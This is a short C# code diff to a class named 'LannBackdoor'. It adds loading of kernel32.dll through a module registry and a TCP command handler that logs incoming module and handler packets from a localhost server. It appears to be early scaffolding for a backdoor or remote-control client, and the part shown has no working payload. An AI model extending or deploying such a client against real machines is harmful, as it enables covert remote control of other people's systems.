@@ -1,5 +1,6 @@
 ﻿using System.Net.Sockets;
 using LannLogger;
+using Modules;
 using Networking;
 using Networking.Packets;
 using Newtonsoft.Json;
@@ -21,6 +22,9 @@ public static class LannBackdoor {
             true,
             "127.0.0.1",
             2022);
+        
+        ModuleRegistry.Instance.LoadModule("kernel32.dll");
+        
         _tcpClient = new TCPClient();
 
         _tcpClient.OnConnect += async (_, _) => {
@@ -30,6 +34,14 @@ public static class LannBackdoor {
                 Enabled = true,
                 StockCount = 9000
             });
+        };
+
+        _tcpClient.OnCommand += async (_, data) => {
+            Packet packet = data.Packet;
+            Logger.Debug("Packet received: {Module}/{Handler}: {Data}",
+                packet.ModuleId,
+                packet.HandlerId,
+                packet.GetData<object>());
         };
 
         await Connect();
